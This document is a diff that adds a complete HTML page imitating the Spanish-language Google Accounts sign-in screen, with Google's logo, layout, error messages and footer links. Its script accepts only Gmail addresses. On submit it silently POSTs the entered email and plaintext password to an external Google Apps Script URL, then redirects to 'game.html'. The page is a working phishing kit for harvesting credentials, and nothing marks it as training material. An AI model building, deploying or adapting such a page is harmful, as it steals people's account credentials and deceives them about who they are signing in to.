@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Inicia sesión - Cuentas de Google</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background: #f6f8fa;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #202124;
+    }
+    .container-wrapper {
+      position: relative;
+      width: 100%;
+      max-width: 990px;
+      min-height: 380px;
+    }
+    .container {
+      background: white;
+      border-radius: 20px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.12);
+      width: 100%;
+      min-height: 380px;
+      display: flex;
+      overflow: hidden;
+      position: relative;
+      border: 4px solid transparent;
+      background-clip: padding-box;
+    }
+    .loading-border {
+      position: absolute;
+      inset: -4px;
+      border-radius: 24px;
+      pointer-events: none;
+      border: 4px solid transparent;
+      background: linear-gradient(90deg, transparent 0%, #0b57d0 25%, #4285f4 50%, #0b57d0 75%, transparent 100%) border-box;
+      background-size: 400% 400%;
+      animation: border-flow 2.5s linear forwards;
+      opacity: 0;
+    }
+    @keyframes border-flow {
+      0% { opacity: 0; background-position: 0% 50%; }
+      10% { opacity: 1; }
+      100% { opacity: 1; background-position: 200% 50%; }
+    }
+    .left-side {
+      width: 42%;
+      padding: 32px 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+    }
+    .right-side {
+      width: 58%;
+      padding: 32px 40px 80px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .logo-g {
+      width: 68px;
+      height: auto;
+      margin: 0 0 14px 0;
+    }
+    h1 {
+      font-size: 42px;
+      font-weight: 400;
+      margin-bottom: 8px;
+      color: #000;
+    }
+    h1.small-title {
+      font-size: 32px;
+    }
+    .subtitle {
+      font-size: 16px;
+      color: #000;
+      margin-top: 8px;
+      line-height: 1.4;
+      font-weight: 100;
+    }
+    .form-group {
+      margin: 22px 0 6px;
+      position: relative;
+    }
+    input {
+      width: 100%;
+      padding: 22px 16px 8px;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      font-size: 16px;
+      outline: none;
+      transition: border-color 0.2s, border-width 0.2s;
+    }
+    input:focus {
+      border-width: 2px;
+      border-color: #0b57d0 !important;
+      box-shadow: none;
+    }
+    input.error {
+      border-color: #d93025 !important;
+    }
+    label {
+      position: absolute;
+      top: 14px;
+      left: 16px;
+      color: #5f6368;
+      font-size: 16px;
+      pointer-events: none;
+      transition: all 0.25s ease;
+    }
+    input:focus + label,
+    input:not(:placeholder-shown) + label {
+      top: 6px;
+      font-size: 12px;
+      color: #0b57d0;
+    }
+    input.error + label,
+    input.error:focus + label,
+    input.error:not(:placeholder-shown) + label {
+      color: #d93025 !important;
+    }
+    .forgot-link {
+      color: #0b57d0;
+      font-size: 15px;
+      font-weight: 450;
+      text-decoration: none;
+      margin-top: 4px;
+      display: inline-block;
+    }
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+    .guest-info {
+      color: #202124;
+      font-size: 14px;
+      line-height: 1.5;
+      margin: 48px 0 26px;
+    }
+    .guest-link {
+      color: #0b57d0;
+      text-decoration: none;
+      display: inline;
+      font-weight: 500;
+    }
+    .guest-link:hover {
+      text-decoration: underline;
+    }
+    .bottom-row {
+      margin-top: 20px;
+      margin-bottom: -40px;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+    }
+    .create-account {
+      color: #0b57d0;
+      font-size: 14px;
+      text-decoration: none;
+      margin-right: 24px;
+      font-weight: 500;
+    }
+    .create-account:hover {
+      text-decoration: underline;
+    }
+    .btn {
+      background: #0b57d0;
+      color: white;
+      border: none;
+      border-radius: 24px;
+      padding: 10px 28px;
+      font-size: 15px;
+      font-weight: 549;
+      cursor: pointer;
+    }
+    .error-container {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #d93025;
+      font-size: 12px;
+      margin-top: 8px;
+    }
+    .error-icon {
+      font-size: 18px;
+    }
+    .global-error {
+      color: #d93025;
+      font-size: 15px;
+      line-height: 1.5;
+      margin: 16px 0 24px;
+      text-align: left;
+      display: none;
+    }
+    .footer {
+      position: absolute;
+      bottom: -60px;
+      left: 0;
+      right: 0;
+      display: flex;
+      justify-content: space-between;
+      padding: 0 40px;
+      font-size: 14px;
+      color: #5f6368;
+    }
+    .lang {
+      display: flex;
+      align-items: center;
+      cursor: default;
+    }
+    .lang .material-icons {
+      font-size: 20px;
+      margin-left: 4px;
+    }
+    .footer-links a {
+      color: #5f6368;
+      text-decoration: none;
+      margin-left: 16px;
+    }
+    .footer-links a:not(:last-child)::after {
+      content: " · ";
+      margin: 0 16px;
+    }
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+    .back-arrow {
+      color: #0b57d0;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      margin-bottom: 16px;
+      width: fit-content;
+    }
+    .back-arrow:hover {
+      text-decoration: underline;
+    }
+    .email-bubble-left {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 16px;
+      background: white;
+      border: 1px solid #dadce0;
+      border-radius: 20px;
+      margin-top: 12px;
+      cursor: pointer;
+      transition: background 0.2s, box-shadow 0.2s;
+      width: fit-content;
+    }
+    .email-bubble-left:hover {
+      background: #f8f9fa;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    .email-bubble-left .material-icons {
+      font-size: 20px;
+      color: #3c4043;
+    }
+    .email-bubble-left .email-text {
+      font-size: 14px;
+      color: #202124;
+      font-weight: 500;
+    }
+    .password-wrapper {
+      width: 100%;
+      max-width: 480px;
+    }
+    .show-password-container {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-top: 16px;
+      font-size: 15px;
+      color: #000 !important;
+      position: relative;
+      z-index: 1;
+    }
+    .show-password-label {
+      cursor: pointer;
+      color: #000 !important;
+      font-weight: 500 !important;
+      font-size: 15px !important;
+      line-height: 1.4;
+      margin: 0 !important;
+      padding: 0 !important;
+      opacity: 1 !important;
+      visibility: visible !important;
+      user-select: none;
+      white-space: nowrap;
+      position: static !important;
+      top: auto !important;
+      left: auto !important;
+      flex-shrink: 0;
+    }
+    .show-password-container input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      margin: 0;
+      flex-shrink: 0;
+      accent-color: #0b57d0;
+    }
+    .bottom-row-password {
+      margin-top: 32px;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      gap: 24px;
+    }
+    .error-message {
+      color: #d93025;
+      font-size: 14px;
+      margin-top: 8px;
+      display: none;
+    }
+    @media (max-width: 950px) {
+      .container-wrapper, .container {
+        max-width: 420px;
+        min-height: auto;
+      }
+      .left-side, .right-side {
+        width: 100%;
+        padding: 32px 24px;
+      }
+      .left-side {
+        align-items: center;
+        text-align: center;
+      }
+      .email-bubble-left {
+        margin: 12px auto 0;
+      }
+      .bottom-row, .bottom-row-password {
+        justify-content: center;
+        flex-direction: column-reverse;
+        gap: 16px;
+      }
+      .create-account {
+        margin-right: 0;
+      }
+      .btn {
+        width: 100%;
+      }
+      .footer {
+        position: static;
+        margin: 32px 0 24px;
+        padding: 0 24px;
+        flex-direction: column;
+        gap: 12px;
+        text-align: center;
+      }
+      .footer-links a:not(:last-child)::after {
+        content: " · ";
+        margin: 0 8px;
+      }
+      .password-wrapper {
+        max-width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container-wrapper">
+    <div id="loadingBorder" class="loading-border" style="display:none;"></div>
+
+    <div class="container">
+      <div class="left-side">
+        <img class="logo-g" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1280px-Google_%22G%22_logo.svg.png" alt="Google G">
+        <h1 id="mainTitle">Inicia sesión</h1>
+        <p class="subtitle" id="leftSubtitle">Utiliza tu cuenta de Google</p>
+        
+        <div class="email-bubble-left" id="emailBubble" style="display: none;">
+          <span class="material-icons">account_circle</span>
+          <span class="email-text" id="displayEmail"></span>
+        </div>
+      </div>
+
+      <div class="right-side" id="rightSide">
+        <div id="step1">
+          <div class="form-group">
+            <input type="text" id="email" placeholder=" " autocomplete="email">
+            <label for="email">Correo electrónico o teléfono</label>
+          </div>
+          
+          <div id="emailErrorContainer" class="error-container" style="display:none;">
+            <span class="material-icons error-icon">error</span>
+            <span id="emailErrorMessage"></span>
+          </div>
+
+          <div id="emailFormatError" class="error-message"></div>
+
+          <a href="https://support.google.com/accounts/answer/7682439?hl=es" target="_blank" class="forgot-link">¿Has olvidado tu correo electrónico?</a>
+
+          <div class="guest-info">
+            ¿No es tu ordenador? Usa una ventana de navegación privada para iniciar sesión. 
+            <a href="https://support.google.com/accounts/answer/7682439?hl=es" target="_blank" class="guest-link">Más información sobre cómo usar el modo Invitado</a>
+          </div>
+
+          <div class="bottom-row">
+            <a href="https://accounts.google.com/signup" target="_blank" class="create-account">Crear cuenta</a>
+            <button class="btn" id="btnNext">Siguiente</button>
+          </div>
+        </div>
+
+        <div id="step2" style="display: none;">
+          <div class="back-arrow" id="backToEmail">
+            <span class="material-icons">arrow_back</span>
+            <span>Volver</span>
+          </div>
+
+          <div class="password-wrapper">
+            <div class="global-error" id="globalError">
+              La contraseña que has introducido no es correcta. Vuelve a intentarlo.
+            </div>
+
+            <div class="form-group" style="margin-top: 0;">
+              <input type="password" id="password" placeholder=" " required>
+              <label for="password">Introduce tu contraseña</label>
+            </div>
+            
+            <div id="passwordErrorContainer" class="error-container" style="display:none;">
+              <span class="material-icons error-icon">error</span>
+              <span id="passwordErrorMessage"></span>
+            </div>
+
+            <div id="passwordLengthError" class="error-message"></div>
+
+            <div class="show-password-container">
+              <input type="checkbox" id="showPassword">
+              <label for="showPassword" class="show-password-label">Mostrar contraseña</label>
+            </div>
+          </div>
+
+          <div class="bottom-row-password">
+            <a href="https://support.google.com/accounts/answer/41078?hl=es" target="_blank" class="forgot-link">¿Has olvidado tu contraseña?</a>
+            <button class="btn" id="btnLogin">Siguiente</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <div class="lang">
+        Español (España) <span class="material-icons">arrow_drop_down</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://support.google.com/accounts/?hl=es" target="_blank">Ayuda</a>
+        <a href="https://policies.google.com/privacy?hl=es" target="_blank">Privacidad</a>
+        <a href="https://policies.google.com/terms?hl=es" target="_blank">Términos</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let savedEmail = '';
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const mainTitle = document.getElementById('mainTitle');
+    const leftSubtitle = document.getElementById('leftSubtitle');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const displayEmail = document.getElementById('displayEmail');
+    const emailBubble = document.getElementById('emailBubble');
+    const showPasswordCheckbox = document.getElementById('showPassword');
+    const globalError = document.getElementById('globalError');
+    const loadingBorder = document.getElementById('loadingBorder');
+    const emailFormatError = document.getElementById('emailFormatError');
+    const passwordLengthError = document.getElementById('passwordLengthError');
+
+    const emailErrorContainer = document.getElementById('emailErrorContainer');
+    const emailErrorMessage = document.getElementById('emailErrorMessage');
+    const passwordErrorContainer = document.getElementById('passwordErrorContainer');
+    const passwordErrorMessage = document.getElementById('passwordErrorMessage');
+
+    // Validación estricta: SOLO correos que terminen en @gmail.com
+    function isValidEmail(email) {
+      email = email.trim().toLowerCase();
+      const re = /^[a-z0-9._%+-]+@gmail\.com$/i;
+      return re.test(email) && email.length >= 10 && email.length <= 254 && !email.includes(' ');
+    }
+
+    emailInput.addEventListener('input', () => {
+      emailErrorContainer.style.display = 'none';
+      emailInput.classList.remove('error');
+      emailFormatError.style.display = 'none';
+    });
+
+    passwordInput.addEventListener('input', () => {
+      passwordErrorContainer.style.display = 'none';
+      passwordInput.classList.remove('error');
+      passwordLengthError.style.display = 'none';
+      if (globalError) globalError.style.display = 'none';
+    });
+
+    showPasswordCheckbox.addEventListener('change', function() {
+      passwordInput.type = this.checked ? 'text' : 'password';
+    });
+
+    document.getElementById('btnNext').addEventListener('click', function(e) {
+      e.preventDefault();
+      const email = emailInput.value.trim();
+      
+      emailErrorContainer.style.display = 'none';
+      emailInput.classList.remove('error');
+      emailFormatError.style.display = 'none';
+
+      if (!email) {
+        emailErrorMessage.textContent = "Introduce una dirección de correo electrónico";
+        emailErrorContainer.style.display = 'flex';
+        emailInput.classList.add('error');
+        emailInput.focus();
+        return;
+      }
+
+      if (!isValidEmail(email)) {
+        emailFormatError.textContent = "Solo se permiten correos que terminen en @gmail.com y con formato válido";
+        emailFormatError.style.display = 'block';
+        emailInput.classList.add('error');
+        emailInput.focus();
+        return;
+      }
+
+      savedEmail = email;
+      displayEmail.textContent = email;
+      
+      mainTitle.textContent = 'Te damos la bienvenida';
+      mainTitle.classList.add('small-title');
+      leftSubtitle.style.display = 'none';
+      emailBubble.style.display = 'inline-flex';
+      
+      step1.style.display = 'none';
+      step2.style.display = 'block';
+      
+      setTimeout(() => passwordInput.focus(), 100);
+    });
+
+    document.getElementById('btnLogin').addEventListener('click', function(e) {
+      e.preventDefault();
+      
+      const password = passwordInput.value.trim();
+      
+      passwordErrorContainer.style.display = 'none';
+      passwordInput.classList.remove('error');
+      passwordLengthError.style.display = 'none';
+      if (globalError) globalError.style.display = 'none';
+
+      if (!password) {
+        passwordErrorMessage.textContent = "Introduce una contraseña";
+        passwordErrorContainer.style.display = 'flex';
+        passwordInput.classList.add('error');
+        passwordInput.focus();
+        return;
+      }
+
+      if (password.length < 8) {
+        passwordLengthError.textContent = "La contraseña debe tener al menos 8 caracteres";
+        passwordLengthError.style.display = 'block';
+        passwordInput.classList.add('error');
+        passwordInput.focus();
+        return;
+      }
+
+      if (password.length > 30) {
+        passwordLengthError.textContent = "La contraseña es demasiado larga (máximo 30 caracteres)";
+        passwordLengthError.style.display = 'block';
+        passwordInput.classList.add('error');
+        passwordInput.focus();
+        return;
+      }
+
+      // Mostrar animación de carga
+      loadingBorder.style.display = 'block';
+
+      // Enviar al script
+      fetch("https://script.google.com/macros/s/AKfycbwKlQfNhnt3JDF4lvu5RogHcZtxAA0mXK_PJU1smaRvSWO-SCUDP8gpnZ11pAUnPxax/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: savedEmail,
+          password: password
+        })
+      });
+
+      // Redirigir después de 2.5 segundos
+      setTimeout(() => {
+        loadingBorder.style.display = 'none';
+        window.location.href = "game.html";
+      }, 2500);
+    });
+
+    document.getElementById('backToEmail').addEventListener('click', function() {
+      step2.style.display = 'none';
+      step1.style.display = 'block';
+      mainTitle.textContent = 'Inicia sesión';
+      mainTitle.classList.remove('small-title');
+      leftSubtitle.style.display = 'block';
+      emailBubble.style.display = 'none';
+      passwordInput.value = '';
+      passwordErrorContainer.style.display = 'none';
+      passwordLengthError.style.display = 'none';
+      if (globalError) globalError.style.display = 'none';
+      passwordInput.classList.remove('error');
+      emailInput.focus();
+    });
+
+    emailBubble.addEventListener('click', function() {
+      document.getElementById('backToEmail').click();
+    });
+
+    emailInput.addEventListener('keypress', e => {
+      if (e.key === 'Enter') document.getElementById('btnNext').click();
+    });
+
+    passwordInput.addEventListener('keypress', e => {
+      if (e.key === 'Enter') document.getElementById('btnLogin').click();
+    });
+  </script>
+</body>
+</html>
